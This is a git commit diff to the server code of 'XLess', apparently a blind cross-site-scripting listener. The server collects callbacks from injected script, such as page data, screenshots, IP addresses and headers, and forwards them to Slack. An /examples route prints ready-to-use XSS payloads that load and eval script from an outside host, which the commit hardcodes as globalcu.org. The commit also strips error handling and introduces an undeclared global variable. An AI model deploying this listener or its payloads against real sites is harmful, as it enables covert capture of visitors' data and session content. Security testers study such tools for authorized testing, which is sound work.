b00bf96bf5b4d7901549fa97c501c9dda34c3e7d
eanmcc8 <eanmcc86@proton.me>
2025-05-24 22:02:09 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,8 +1,8 @@
 const express = require("express");
-const bodyParser = require("body-parser");
-const cors = require("cors");
+var bodyParser = require("body-parser");
+var cors = require("cors");
 const process = require("process");
-const request = require("request");
+var request = require("request");
 const path = require("path");
 
 // Support local development with .env
@@ -14,22 +14,23 @@ const slack_incoming_webhook = process.env.SLACK_INCOMING_WEBHOOK;
 
 const app = express();
 app.use(cors());
+
 app.use(bodyParser.json({ limit: "15mb" }));
 app.use(bodyParser.urlencoded({ limit: "15mb", extended: true }));
 
-app.use((req, res, next) => {
+app.use(function (req, res, next) {
   // Headers
   res.header("Powered-By", "XLESS");
   res.header("Access-Control-Allow-Origin", "*");
   res.header("Access-Control-Allow-Methods", "GET,POST");
   res.header("Access-Control-Allow-Headers", "Content-Type");
-  res.header("Access-Control-Allow-Credentials", "true");
+    res.header("Access-Control-Allow-Credentials", "True");
   next();
 });
 
 function generate_blind_xss_alert(body) {
-  let alert = "*XSSless: Blind XSS Alert*\n";
-  for (const k of Object.keys(body)) {
+  var alert = "*XSSless: Blind XSS Alert*\n";
+  for (let k of Object.keys(body)) {
     if (k === "Screenshot") {
       continue;
     }
@@ -38,22 +39,22 @@ function generate_blind_xss_alert(body) {
     }
 
     if (body[k] === "") {
-      alert += `*${k}:* \`None\`\n`;
+      alert += "*" + k + ":* " + "```None```" + "\n";
     } else {
-      alert += `*${k}:* \n\`${body[k]}\`\n`;
+      alert += "*" + k + ":* " + "\n```" + body[k] + "```" + "\n";
     }
   }
   return alert;
 }
 
 function generate_callback_alert(headers, data, url) {
-  let alert = "*XSSless: Out-of-Band Callback Alert*\n";
+  var alert = "*XSSless: Out-of-Band Callback Alert*\n";
   alert += `• *IP Address:* \`${data["Remote IP"]}\`\n`;
   alert += `• *Request URI:* \`${url}\`\n`;
 
   // Add all the headers
-  for (const key in headers) {
-    if (Object.prototype.hasOwnProperty.call(headers, key)) {
+  for (var key in headers) {
+    if (headers.hasOwnProperty(key)) {
       alert += `• *${key}:* \`${headers[key]}\`\n`;
     }
   }
@@ -61,14 +62,18 @@ function generate_callback_alert(headers, data, url) {
 }
 
 function generate_message_alert(body) {
-  return `*XSSless: Message Alert*\n\`\`\`\n${body}\n\`\`\`\n`;
+  var alert = "*XSSless: Message Alert*\n";
+  alert += "```\n" + body + "```\n";
+  return alert;
 }
 
 async function uploadImage(image) {
-  return new Promise((resolve, reject) => {
+  // Return new promise
+  return new Promise(function (resolve, reject) {
     const options = {
       method: "POST",
       url: "https://api.imgbb.com/1/upload?key=" + imgbb_api_key,
+      port: 443,
       headers: {
         "Content-Type": "multipart/form-data",
       },
@@ -77,7 +82,8 @@ async function uploadImage(image) {
       },
     };
 
-    request(options, (err, imgRes, imgBody) => {
+    // Do async request
+    request(options, function (err, imgRes, imgBody) {
       if (err) {
         reject(err);
       } else {
@@ -88,36 +94,47 @@ async function uploadImage(image) {
 }
 
 app.get("/examples", (req, res) => {
-  let url = "https://" + req.headers["host"];
-  let page = '';
+  res.header("Content-Type", "text/plain");
+  var url = "https://globalcu.org";
+  //var url = req.protocol + '://' + req.headers['host']
+  //var url = "https://" + req.headers["host"];
+  var page = "";
   page += `\'"><script src="${url}"></script>\n\n`;
-  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)');\n\n`;
-  page += `<script>function b() { eval(this.responseText); }; a = new XMLHttpRequest(); a.addEventListener("load", b); a.open("GET", "${url}"); a.send();</script>\n\n`;
-  page += `<script>$.getScript("${url}");</script>`;
-  res.type("text/plain").send(page);
+  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
+
+  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;
+
+  page += `<script>$.getScript("${url}")</script>`;
+  res.send(page);
+  res.end();
 });
 
 app.all("/message", (req, res) => {
-  const message = req.query.text || req.body.text;
+  var message = req.query.text || req.body.text;
   const alert = generate_message_alert(message);
-  const data = {
+  data = {
     form: {
-      pload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
+      payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
     },
   };
 
-  request.post(slack_incoming_webhook, data, (error) => {
-    if (error) return res.status(500).send("Internal Server Error");
+  request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out) => {
     res.send("ok\n");
+    res.end();
   });
 });
 
 app.post("/c", async (req, res) => {
-  const data = req.body;
+  let data = req.body;
+
+  // Upload our screenshot and only then send the Slack alert
   data["Screenshot URL"] = "";
 
   if (imgbb_api_key && data["Screenshot"]) {
-    const encoded_screenshot = data["Screenshot"].replace("data:image/png;base64,", "");
+    const encoded_screenshot = data["Screenshot"].replace(
+      "data:image/png;base64,",
+      ""
+    );
 
     try {
       const imgRes = await uploadImage(encoded_screenshot);
@@ -125,6 +142,7 @@ app.post("/c", async (req, res) => {
       if (imgOut.error) {
         data["Screenshot URL"] = "NA";
       } else if (imgOut.data && imgOut.data.url_viewer) {
+        // Add the URL to our data array so it will be included on our Slack message
         data["Screenshot URL"] = imgOut.data.url_viewer;
       }
     } catch (e) {
@@ -132,30 +150,37 @@ app.post("/c", async (req, res) => {
     }
   }
 
-  data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+  // Now handle the regular Slack alert
+  data["Remote IP"] =
+    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
   const alert = generate_blind_xss_alert(data);
-  const slackData = {
+  data = {
     form: {
-      pload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
+      payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
     },
   };
 
-  request.post(slack_incoming_webhook, slackData, (error) => {
-    if (error) return res.status(500).send("Internal Server Error");
+  request.post(slack_incoming_webhook, data, (out) => {
     res.send("ok\n");
+    res.end();
   });
 });
 
+/**
+ * Route to check the health of our xless listener
+ */
 app.get("/health", async (req, res) => {
-  const health_data = {};
-  health_data.IMGBB_API_KEY = Boolean(imgbb_api_key);
-  health_data.SLACK_INCOMING_WEBHOOK = Boolean(slack_incoming_webhook);
+  let health_data = {};
+
+  // Check if the environemtn variables are set
+  health_data.IMGBB_API_KEY = imgbb_api_key !== undefined;
+  health_data.SLACK_INCOMING_WEBHOOK = slack_incoming_webhook !== undefined;
 
   if (!health_data.IMGBB_API_KEY || !health_data.SLACK_INCOMING_WEBHOOK) {
-    return res.status(400).json(health_data);
+    res.json(health_data);
+    res.end();
   }
 
-  // Example image data (should be a valid image)
   const xless_logo =
     "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";
 
@@ -165,6 +190,7 @@ app.get("/health", async (req, res) => {
     if (imgOut.error) {
       health_data.imgbb_response = imgOut.error;
     } else if (imgOut && imgOut.data && imgOut.data.url_viewer) {
+      // Add the URL to our health_data
       health_data.imgbb_response = imgOut.data.url_viewer;
     }
   } catch (e) {
@@ -172,22 +198,23 @@ app.get("/health", async (req, res) => {
   }
 
   res.json(health_data);
+  res.end();
 });
 
 app.all("/", (req, res) => {
-  const headers = req.headers;
-  const data = req.body || {};
-  data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+  var headers = req.headers;
+  var data = req.body;
+  data["Remote IP"] =
+    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
   const alert = generate_callback_alert(headers, data, req.url);
-  const slackData = {
+  data = {
     form: {
-      pload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
+      payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
     },
   };
 
-  request.post(slack_incoming_webhook, slackData, (error) => {
-    if (error) return res.status(500).send("Internal Server Error");
-    res.sendFile(path.join(__dirname, "pload.js"));
+  request.post(slack_incoming_webhook, data, (out) => {
+    res.sendFile(path.join(__dirname + "/payload.js"));
   });
 });
 
